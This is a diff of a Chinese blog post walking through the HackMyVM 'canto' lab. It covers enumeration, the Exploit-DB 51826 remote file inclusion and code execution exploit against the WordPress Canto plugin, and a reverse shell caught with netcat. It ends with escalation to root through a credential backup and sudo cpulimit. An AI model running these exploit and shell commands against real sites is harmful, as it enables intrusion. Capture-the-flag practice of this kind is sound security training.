@@ -143,14 +143,14 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 </div>
     <div id="content">
 <div class="markdown-body" id="postBody"><h1>hmv_canto</h1>
-<p><strong>靶机</strong>：<a href="https://hackmyvm.eu/machines/machine.php?vm=canto" rel="nofollow">https://hackmyvm.eu/machines/machine.php?vm=canto</a><br>
-<strong>难度</strong>：绿色<br>
-<strong>目标 IP</strong>：192.168.205.213<br>
+<p><strong>靶机</strong>：<a href="https://hackmyvm.eu/machines/machine.php?vm=canto">https://hackmyvm.eu/machines/machine.php?vm=canto</a>
+<strong>难度</strong>：绿色
+<strong>目标 IP</strong>：192.168.205.213
 <strong>本机</strong> IP：192.168.205.141</p>
-<hr>
+<hr />
 <h3><strong>1. 端口枚举及服务探测</strong></h3>
-<p>首先，使用 <code class="notranslate">nmap</code> 扫描目标 IP 的开放端口：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~]
+<p>首先，使用 <code>nmap</code> 扫描目标 IP 的开放端口：</p>
+<pre lang="bash"><code>┌──(kali㉿kali)-[~]
 └─$ nmap -sV -sT -O -Pn -n -p- 192.168.205.213
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-29 19:05 CST
 Nmap scan report for 192.168.205.213
@@ -172,16 +172,16 @@ Nmap done: 1 IP address (1 host up) scanned in 10.13 seconds
 
 </code></pre>
 <p>扫描结果显示目标机器开放了 22 (SSH) 和 80 (HTTP) 端口。</p>
-<hr>
+<hr />
 <h3><strong>2. Web 服务探测与Wordpress Plugin Canto远程执行漏洞</strong></h3>
 <p>对 80 端口感兴趣，访问 Web 页面，扫描一下结构</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~]
+<pre lang="bash"><code>┌──(kali㉿kali)-[~]
 └─$ whatweb http://192.168.205.213        
 http://192.168.205.213 [200 OK] Apache[2.4.57], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.57 (Ubuntu)], IP[192.168.205.213], MetaGenerator[WordPress 6.7.1], Script[importmap,module], Title[Canto], UncommonHeaders[link], WordPress[6.7.1]
                                                                                                 
 </code></pre>
 <p>是WordPress，wpscan启动</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~]
+<pre lang="bash"><code>┌──(kali㉿kali)-[~]
 └─$ wpscan --url http://192.168.205.213 -e vp,u --api-token xxx   #api-token注册wpscan官网获取
 _______________________________________________________________
          __          _______   _____
@@ -288,7 +288,7 @@ Interesting Finding(s):
                                                     
 </code></pre>
 <p>然后我拿erik爆破了WordPress还爆破了ssh，都没有结果，回去看了眼网页发现他是WordPress，为什么起名Canto还写的有模样有的，我还以为是CMS呢，搜索了一下这个名字的漏洞</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+<pre lang="bash"><code>┌──(kali㉿kali)-[~/test]
 └─$ searchsploit Canto                  
 ----------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                       |  Path
@@ -301,7 +301,7 @@ Shellcodes: No Results
                            
 </code></pre>
 <p>然后我发现这不会是个插件吧，用了一下php/webapps/51826.py，发现还真是</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+<pre lang="bash"><code>┌──(kali㉿kali)-[~/test]
 └─$ searchsploit -m php/webapps/51826.py
   Exploit: Wordpress Plugin Canto &lt; 3.0.5 - Remote File Inclusion (RFI) and Remote Code Execution (RCE)
       URL: https://www.exploit-db.com/exploits/51826
@@ -348,17 +348,17 @@ options:
 └─$ python3 51826.py -u http://192.168.205.213 -LHOST 192.168.205.141           
 Exploitation URL: http://192.168.205.213/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://192.168.205.141:8080&amp;cmd=whoami
 Local web server on port 8080...
-192.168.205.213 - - [29/Dec/2024 19:37:27] "GET /wp-admin/admin.php HTTP/1.1" 200 -
+192.168.205.213 - - [29/Dec/2024 19:37:27] &quot;GET /wp-admin/admin.php HTTP/1.1&quot; 200 -
 Server response:
 www-data
 </code></pre>
 <p>后面就按照提示使用脚本就好了</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+<pre lang="bash"><code>┌──(kali㉿kali)-[~/test]
 └─$ python3 51826.py -u http://192.168.205.213 -LHOST 192.168.205.141 -s index.php
 Exploitation URL: http://192.168.205.213/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://192.168.205.141:8080&amp;cmd=whoami
 invalid local port None
 Local web server on port 8080...
-192.168.205.213 - - [29/Dec/2024 19:25:16] "GET /wp-admin/admin.php HTTP/1.1" 200 -
+192.168.205.213 - - [29/Dec/2024 19:25:16] &quot;GET /wp-admin/admin.php HTTP/1.1&quot; 200 -
 
 ┌──(kali㉿kali)-[~]
 └─$ nc -lvnp 8888                           
@@ -372,7 +372,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 <p>成功弹了回来</p>
 <h3>3.<strong>获得稳定 shell</strong></h3>
 <p>获得交互式 TTY shell：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">script /dev/null -c bash  
+<pre lang="bash"><code>script /dev/null -c bash  
 ctrl+z  
 stty raw -echo; fg  
 reset xterm  
@@ -382,7 +382,7 @@ export SHELL=/bin/bash
 stty rows 59 cols 236
 </code></pre>
 <h3>4.<strong>提权</strong></h3>
-<pre lang="bash" class="notranslate"><code class="notranslate">www-data@canto:/home$ ls -al
+<pre lang="bash"><code>www-data@canto:/home$ ls -al
 total 12
 drwxr-xr-x  3 root root     4096 May 12  2024 .
 drwxr-xr-x 20 root root     4096 May 12  2024 ..
@@ -390,7 +390,7 @@ drwxr-xr--  5 erik www-data 4096 May 12  2024 erik
 
 </code></pre>
 <p>发现我有erik的访问权限，进去溜达了一下</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">www-data@canto:/home/erik$ ls -al
+<pre lang="bash"><code>www-data@canto:/home/erik$ ls -al
 total 36
 drwxr-xr-- 5 erik www-data 4096 May 12  2024 .
 drwxr-xr-x 3 root root     4096 May 12  2024 ..
@@ -427,8 +427,8 @@ Day2.txt
 
 我差点丢失了用户的数据库，所以我创建了一个备份文件夹。
 </code></pre>
-<p>备份文件夹我很感兴趣，通常关于网站的应该都在<code class="notranslate">/var/www/</code>里</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">www-data@canto:/var/www$ ls -al
+<p>备份文件夹我很感兴趣，通常关于网站的应该都在<code>/var/www/</code>里</p>
+<pre lang="bash"><code>www-data@canto:/var/www$ ls -al
 total 16
 drwxr-xr-x  3 www-data www-data 4096 May 12  2024 .
 drwxr-xr-x 15 root     root     4096 May 12  2024 ..
@@ -460,8 +460,8 @@ cat 12052024.txt
 exit
 
 </code></pre>
-<p>有个<code class="notranslate">.bash_history</code>，答案显而易见了<code class="notranslate">/var/wordpress/backups/12052024.txt</code>，成功登录erik用户,<code class="notranslate">sudo -l</code>一下</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">erik@canto:~$ sudo -l
+<p>有个<code>.bash_history</code>，答案显而易见了<code>/var/wordpress/backups/12052024.txt</code>，成功登录erik用户,<code>sudo -l</code>一下</p>
+<pre lang="bash"><code>erik@canto:~$ sudo -l
 Matching Defaults entries for erik on canto:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
 
@@ -469,12 +469,13 @@ User erik may run the following commands on canto:
     (ALL : ALL) NOPASSWD: /usr/bin/cpulimit
 
 </code></pre>
-<p><a href="https://gtfobins.github.io/gtfobins/cpulimit/#sudo" rel="nofollow">cpulimit sudo 提权方法</a></p>
-<pre lang="bash" class="notranslate"><code class="notranslate">erik@canto:~$ sudo cpulimit -l 100 -f /bin/sh
+<p><a href="https://gtfobins.github.io/gtfobins/cpulimit/#sudo">cpulimit sudo 提权方法</a></p>
+<pre lang="bash"><code>erik@canto:~$ sudo cpulimit -l 100 -f /bin/sh
 Process 2669 detected
 # id
 uid=0(root) gid=0(root) groups=0(root)
-</code></pre></div>
+</code></pre>
+</div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
